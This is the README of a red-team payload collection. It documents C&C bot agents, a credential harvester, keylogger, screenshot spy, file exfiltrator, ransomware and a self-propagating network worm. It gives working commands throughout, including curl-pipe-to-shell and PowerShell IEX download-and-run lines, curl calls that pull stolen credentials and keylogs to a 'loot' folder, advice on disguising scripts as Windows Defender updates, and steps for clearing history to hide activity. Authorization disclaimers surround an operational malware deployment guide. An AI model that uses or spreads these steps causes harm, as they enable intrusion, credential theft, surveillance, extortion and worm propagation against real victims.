# Red Team Payloads & Post-Exploitation Modules

Comprehensive payload collection for authorized penetration testing and red team engagements.

## ⚠️ CRITICAL WARNING
**FOR AUTHORIZED PENETRATION TESTING ONLY**
- Only use on systems you own or have explicit written permission to test
- Unauthorized use is **ILLEGAL** and unethical
- These tools are for professional security testing only
- Misuse can result in criminal prosecution

## Payload Categories

### 1. Initial Access Agents (Auto-Registration)
These payloads establish persistent C&C connections and register bots automatically.

### 2. Post-Exploitation Modules
Advanced tools for credential harvesting, surveillance, and data exfiltration.

---

## Initial Access Payloads

### 1. Python Agent (Cross-Platform)
**File:** `python_agent.py`

**Features:**
- Works on Windows, Linux, and macOS
- Automatic bot registration
- Persistence mechanisms
- Keep-alive beacon

**Usage:**
```bash
# Edit the configuration in the file first
python python_agent.py
```

**Configuration:**
Edit these variables in the script:
```python
CNC_SERVER = "http://192.168.1.10:5000"  # Your C&C server IP
SSH_PASSWORD = "your_password"           # Target SSH password
```

### 2. Linux Agent (Bash)
**File:** `linux_agent.sh`

**Features:**
- Native bash script for Linux systems
- Systemd service (if root) or cron job persistence
- Process hiding
- Lightweight and fast

**Usage:**
```bash
# Make executable
chmod +x linux_agent.sh

# Run with default settings
./linux_agent.sh

# Run with custom C&C server and bot ID
./linux_agent.sh http://192.168.1.10:5000 my-custom-bot-id
```

**Configuration:**
Edit the script or pass parameters:
```bash
CNC_SERVER="http://your-cnc-ip:5000"
SSH_PASSWORD="your_password"
```

### 3. Windows Agent (PowerShell)
**File:** `windows_agent.ps1`

**Features:**
- Native PowerShell for Windows systems
- Startup folder persistence
- System information gathering
- Beacon loop

**Usage:**
```powershell
# Run with default settings
.\windows_agent.ps1

# Run with custom parameters
.\windows_agent.ps1 -CncServer "http://192.168.1.10:5000" -BotId "custom-bot-id"
```

**Configuration:**
Edit these variables in the script:
```powershell
$CncServer = "http://192.168.1.10:5000"  # Your C&C server IP
password = "your_password"                # Target SSH password
```

## Deployment Methods

### Method 1: Direct Execution
Copy the payload to the target and execute directly:
```bash
# Linux
scp linux_agent.sh user@target:/tmp/
ssh user@target "bash /tmp/linux_agent.sh"

# Windows
# Copy via SMB or RDP, then execute
```

### Method 2: Social Engineering
Embed the payload in a seemingly legitimate script or application.

### Method 3: Exploit Delivery
Use with exploitation frameworks to automatically deploy after successful exploitation.

### Method 4: USB Drop
Place on USB drives with autorun capabilities (Windows).

### Method 5: Web Delivery
Host the payload on a web server and execute remotely:
```bash
# Linux
curl http://your-server/linux_agent.sh | bash

# Windows
IEX (New-Object Net.WebClient).DownloadString('http://your-server/windows_agent.ps1')

# Python
curl http://your-server/python_agent.py | python3
```

## Pre-Deployment Checklist

1. **Update Configuration**
   - [ ] Set correct C&C server IP and port
   - [ ] Configure SSH credentials
   - [ ] Customize bot ID format (optional)

2. **Test in Controlled Environment**
   - [ ] Test on your own machines first
   - [ ] Verify registration with C&C server
   - [ ] Check persistence mechanisms
   - [ ] Validate command execution

3. **Obfuscation (Optional)**
   - [ ] Rename scripts to innocuous names
   - [ ] Obfuscate code to avoid detection
   - [ ] Encode strings and URLs
   - [ ] Remove comments and debug messages

4. **Cleanup**
   - [ ] Remove default passwords
   - [ ] Remove hardcoded IPs (use DNS if possible)
   - [ ] Remove verbose logging

## Detection Avoidance

### Rename Scripts
Use innocuous names:
- `system_update.py`
- `network_check.sh`
- `windows_defender_update.ps1`

### Minimize Output
Redirect output to /dev/null or suppress logging:
```bash
./linux_agent.sh >/dev/null 2>&1 &
```

### Run in Background
Detach from terminal:
```bash
nohup python3 python_agent.py &
```

### Encode Payloads
Base64 encode for less obvious transmission:
```bash
# Encode
base64 python_agent.py > payload.txt

# Decode and execute on target
base64 -d payload.txt | python3
```

## Troubleshooting

### Payload Not Registering
- Check C&C server is running and accessible
- Verify network connectivity from target
- Check firewall rules
- Validate credentials in payload

### Persistence Not Working
- Check user permissions
- Verify file paths exist
- Check antivirus isn't blocking
- Review system logs for errors

### Connection Timeout
- Increase timeout values
- Check network latency
- Verify C&C server is accepting connections
- Check for proxy/NAT issues

## Cleanup Commands

### Remove Persistence (Linux)
```bash
# Systemd
systemctl stop system-monitor.service
systemctl disable system-monitor.service
rm /etc/systemd/system/system-monitor.service

# Cron
crontab -l | grep -v "agent" | crontab -
```

### Remove Persistence (Windows)
```powershell
# Remove startup entry
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system_service.*"
```

---

## Post-Exploitation Modules

### 6. Credential Harvester
**File:** `credential_harvester.py`

**Features:**
- Extracts passwords from browsers (Chrome, Firefox, Edge, Safari)
- Harvests SSH private keys
- Collects saved WiFi passwords (Windows)
- Extracts /etc/shadow hashes (Linux, requires root)
- Searches bash/PowerShell history for credentials
- Collects environment variables with secrets
- Saves RDP/Windows saved credentials
- Outputs to JSON format

**Usage:**
```bash
# Run harvester
python credential_harvester.py

# Output saved to: credentials.json
```

**Targets:**
- Browser password databases
- SSH keys (~/.ssh/)
- System credential stores
- Command history files
- Configuration files

### 7. Keylogger
**File:** `keylogger.py`

**Features:**
- Cross-platform keystroke capture
- Timestamp each keystroke
- Captures special keys
- Periodic auto-save
- Silent operation
- Supports pynput library
- Windows ctypes fallback

**Usage:**
```bash
# Install dependency (optional but recommended)
pip install pynput

# Run keylogger
python keylogger.py --output keylog.txt --interval 10

# Single instance
python keylogger.py --output keylog.txt
```

**Note:** Linux/macOS may require root/accessibility permissions.

### 8. Screenshot Capture
**File:** `screenshot_capture.py`

**Features:**
- Automated screenshot capture
- Configurable capture intervals
- Cross-platform support
- Silent operation
- Multiple library support (PIL, mss, scrot)
- Time-stamped filenames

**Usage:**
```bash
# Install dependencies
pip install pillow mss

# Capture every 60 seconds
python screenshot_capture.py --interval 60 --output screenshots/

# Capture for 10 minutes
python screenshot_capture.py --interval 30 --duration 600

# Single screenshot
python screenshot_capture.py --single
```

**Dependencies:**
- Pillow (PIL) or mss library
- Linux: may need scrot (`apt-get install scrot`)

### 9. Network Scanner
**File:** `network_scanner.py`

**Features:**
- Local network host discovery
- Port scanning (common or all ports)
- Service identification
- Hostname resolution
- Multi-threaded scanning
- Saves results to file
- Single host detailed scan

**Usage:**
```bash
# Scan local network
python network_scanner.py --output network_scan.txt

# Scan single host (common ports)
python network_scanner.py --target 192.168.1.100

# Scan specific ports
python network_scanner.py --target 192.168.1.100 --ports 22,80,443,3389

# Full port scan (1-65535)
python network_scanner.py --target 192.168.1.100 --full
```

**Common Ports Scanned:**
- 21 (FTP), 22 (SSH), 23 (Telnet)
- 80 (HTTP), 443 (HTTPS)
- 445 (SMB), 3389 (RDP)
- 5900 (VNC), 8080 (HTTP-Alt)

### 10. File Exfiltrator
**File:** `file_exfiltrator.py`

**Features:**
- Searches for sensitive files by pattern
- Content-based file search
- Preserves directory structure
- Creates ZIP archives
- Configurable file size limits
- Searches common sensitive directories
- Identifies passwords, keys, configs

**Usage:**
```bash
# Search and collect files
python file_exfiltrator.py --output exfiltrated_data --archive

# Search specific path
python file_exfiltrator.py --search-path /home/user/Documents --archive

# Custom patterns
python file_exfiltrator.py --patterns "*.pdf,*.docx,*password*" --archive

# Search by content
python file_exfiltrator.py --search-content "password,secret,api_key" --archive
```

**Sensitive Patterns:**
- Documents: *.pdf, *.doc, *.xls
- Keys: *.pem, *id_rsa*, *.ppk
- Configs: *.conf, *.xml, *.json, *.env
- Databases: *.db, *.sqlite, *.sql
- Backups: *backup*, *.bak

### 11. Privilege Escalation Checker
**File:** `privesc_checker.py`

**Features:**
- Automated privesc vector detection
- SUID binary enumeration (Linux)
- Sudo permission checks
- Writable system file detection
- Unquoted service paths (Windows)
- AlwaysInstallElevated check (Windows)
- Docker/LXD group membership
- Kernel version checks
- Generates detailed report

**Usage:**
```bash
# Run all checks
python privesc_checker.py

# Report saved to: privesc_report.txt
```

**Checks Performed:**

**Linux:**
- SUID/SGID binaries
- Sudo permissions
- Writable /etc/passwd, /etc/shadow
- Cron jobs
- Docker/LXD group membership
- Writable systemd services
- Kernel version

**Windows:**
- Administrator status
- AlwaysInstallElevated registry
- Unquoted service paths
- Weak service permissions
- Scheduled tasks
- Saved credentials

**macOS:**
- Root status
- Sudo permissions
- Writable applications

### 13. Ransomware (⚠️ CRITICAL RISK)
**Files:** `ransomware.py`, `windows_ransomware.ps1`

**Features:**
- AES-256 file encryption using PBKDF2 key derivation
- Wallpaper modification (DeadSec branding)
- Ransom note generation on Desktop
- C2 encryption key exfiltration
- Targets 30+ file extensions (.txt, .pdf, .doc, .jpg, .sql, .py, etc.)
- Targets Documents, Desktop, Pictures, Downloads directories
- Limits to 100 files for system stability
- Unique victim ID generation
- Persistent ransom display

**⚠️ EXTREME CAUTION:**
- This is a **DESTRUCTIVE** payload that encrypts files
- Only use in **ISOLATED TEST ENVIRONMENTS**
- Always use `--simulate` flag for testing
- Keep encryption keys backed up for recovery
- This is for **DEMONSTRATION AND TESTING ONLY**

**Usage:**
```bash
# ALWAYS TEST IN SIMULATION MODE FIRST
python ransomware.py --simulate

# Production mode (requires explicit confirmation)
python ransomware.py --c2 http://cnc-server:5000

# Windows PowerShell version
powershell -ExecutionPolicy Bypass -File windows_ransomware.ps1 -Simulate
powershell -ExecutionPolicy Bypass -File windows_ransomware.ps1 -C2Server "http://cnc-server:5000"
```

**Dependencies:**
```bash
pip install cryptography requests
```

**C2 Integration:**
- Encryption keys sent to `/ransomware_data` endpoint
- Keys stored in `ransom_keys/{victim_id}.key`
- Victim data includes: hostname, username, encrypted file list, timestamp

**Recovery:**
- Encryption keys stored on C2 server
- Use victim ID to retrieve key from ransom_keys directory
- Decryption tool can be created using stored keys

### 14. Network Worm (⚠️ HIGH RISK)
**Files:** `network_worm.py`, `windows_network_worm.ps1`

**Features:**
- Automated network discovery (scans /24 CIDR range)
- Multi-threaded port scanning (20 concurrent threads)
- 14 exploit vectors: SMB (445), NetBIOS (139), RDP (3389), SSH (22), WinRM (5985/5986), MSSQL (1433), MySQL (3306), PostgreSQL (5432), MongoDB (27017), Redis (6379), Telnet (23), FTP (21), VNC (5900)
- Credential brute forcing with common passwords
- Lateral movement capabilities
- Automatic bot agent deployment (python_agent.py)
- Windows and Linux persistence mechanisms
- C2 infection reporting
- Self-propagating across network segments

**⚠️ EXTREME CAUTION:**
- This payload is **SELF-PROPAGATING**
- Can spread beyond intended scope if not contained
- Only use in **FULLY ISOLATED LAB ENVIRONMENTS**
- Not for production network testing
- Can trigger security alerts and network segmentation
- This is for **RESEARCH AND CONTROLLED TESTING ONLY**

**Usage:**
```bash
# Stealth mode (slower, less aggressive)
python network_worm.py --c2 http://cnc-server:5000

# Aggressive mode (faster scanning, more detectable)
python network_worm.py --c2 http://cnc-server:5000 --aggressive

# Windows PowerShell version
powershell -ExecutionPolicy Bypass -File windows_network_worm.ps1 -C2Server "http://cnc-server:5000"
```

**Dependencies:**
```bash
# Core (required)
# No external dependencies for basic functionality

# Optional (for SSH exploitation)
pip install paramiko
```

**C2 Integration:**
- Infection reports sent to `/worm_report` endpoint
- Reports include: worm ID, infected hosts, network map, exploit methods used
- Real-time propagation tracking

**Safeguards:**
- Limits scanning to 50 IPs per iteration
- Port scanning timeout: 0.5 seconds per port
- Does not exploit localhost/loopback (127.0.0.1)
- Configurable target exclusion list

**Lab Setup Recommendations:**
1. Use completely isolated virtual network
2. No internet connectivity
3. Snapshot VMs before testing
4. Monitor network traffic during test
5. Have kill switch ready (stop C2 server)

---

## Deployment Workflow

### Phase 1: Initial Access
1. Deploy agent (python_agent.py, linux_agent.sh, or windows_agent.ps1)
2. Verify registration in C&C
3. Confirm persistence

### Phase 2: Reconnaissance
1. Run network scanner to map environment
2. Run privilege escalation checker
3. Identify targets for lateral movement

### Phase 3: Credential Harvesting
1. Run credential harvester
2. Start keylogger on target systems
3. Collect credentials via C&C download_file

### Phase 4: Surveillance
1. Deploy screenshot capture on high-value targets
2. Monitor user activity
3. Identify sensitive data locations

### Phase 5: Advanced Operations (⚠️ CAUTION)

**Network Expansion (Use Network Worm):**
1. **ONLY IN ISOLATED LAB** - Deploy network_worm.py
2. Monitor C2 `/worm_report` endpoint for propagation
3. Track infected hosts and network topology
4. Deploy additional payloads to newly recruited bots

**Impact Operations (Use Ransomware):**
1. **ONLY IN ISOLATED LAB** - Test ransomware.py with --simulate first
2. Backup encryption keys from ransom_keys/ directory
3. Deploy only on explicitly authorized test systems
4. Monitor C2 `/ransomware_data` endpoint for encryption reports
5. Validate key storage and recovery procedures

### Phase 5: Data Exfiltration
1. Run file exfiltrator with relevant patterns
2. Create archive of collected data
3. Exfiltrate via C&C upload_file
4. Verify data collection

### Phase 6: Cleanup
1. Stop all payloads
2. Remove persistence
3. Delete payload files
4. Clear logs (if in scope)

---

## Deployment Methods

### Method 1: Via C&C upload_file
```bash
# Upload payload to target
curl -X POST http://cnc:5000/upload_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id":"target-1","local_path":"./keylogger.py","remote_path":"/tmp/kl.py"}'

# Execute via C&C send_command
curl -X POST http://cnc:5000/send_command \
  -H "Content-Type: application/json" \
  -d '{"bot_id":"target-1","command":"python3 /tmp/kl.py &"}'
```

### Method 2: Web Delivery
```bash
# Host payloads on web server
cd payloads
python3 -m http.server 8080

# Execute on target via C&C
curl -X POST http://cnc:5000/send_command \
  -H "Content-Type: application/json" \
  -d '{"bot_id":"target-1","command":"curl http://attacker:8080/keylogger.py|python3"}'
```

### Method 3: Direct Execution
```bash
# Copy to target via SCP
scp credential_harvester.py user@target:/tmp/

# Execute
ssh user@target "python3 /tmp/credential_harvester.py"
```

---

## Data Exfiltration

### Exfiltrate Collected Data
```bash
# Download credentials
curl -X POST http://cnc:5000/download_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id":"target-1","remote_path":"/tmp/credentials.json","local_path":"./loot/creds.json"}'

# Download keylog
curl -X POST http://cnc:5000/download_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id":"target-1","remote_path":"/tmp/keylog.txt","local_path":"./loot/keylog.txt"}'

# Download archive
curl -X POST http://cnc:5000/download_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id":"target-1","remote_path":"/tmp/exfiltrated_20241104.zip","local_path":"./loot/data.zip"}'
```

---

## Required Dependencies

### Python Agents
```bash
# Core dependencies (already installed)
pip install flask paramiko requests

# Keylogger
pip install pynput

# Screenshot capture  
pip install pillow mss

# Ransomware (CRITICAL)
pip install cryptography requests

# Network Worm (SSH support - optional)
pip install paramiko

# All optional dependencies
pip install pynput pillow mss cryptography paramiko
```

### Linux Tools
```bash
# Screenshot support
sudo apt-get install scrot

# Network scanning (optional)
sudo apt-get install nmap
```

---

## Operational Security

### 1. Obfuscate Payloads
- Rename files to innocuous names (system_update.py, network_check.py)
- Base64 encode scripts before transfer
- Use pyinstaller to create executables
- Strip comments and debug code

### 2. Clean Execution
- Delete payloads after use
- Clear command history
- Remove temporary files
- Disable logging where possible

### 3. Secure Collection
- Encrypt exfiltrated archives
- Use secure channels for data transfer
- Delete source files after collection
- Store collected data securely

### 4. Cover Tracks
```bash
# Clear bash history (Linux)
history -c && history -w

# Clear PowerShell history (Windows)
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Delete payload
rm -f payload_file
```

---

## Legal Disclaimer

These tools are provided for **authorized penetration testing and security research only**. 

**Requirements:**
- Explicit written authorization from system owner
- Clearly defined scope of engagement
- Documented rules of engagement
- Professional liability insurance (recommended)

**Legal obligations:**
- Comply with all applicable laws and regulations
- Stay within authorized scope
- Document all actions taken
- Report findings professionally
- Securely handle all collected data

**WARNING:** Unauthorized access to computer systems is a **FEDERAL CRIME** in most jurisdictions.

The authors provide these tools for legitimate security testing only and are not responsible for misuse.
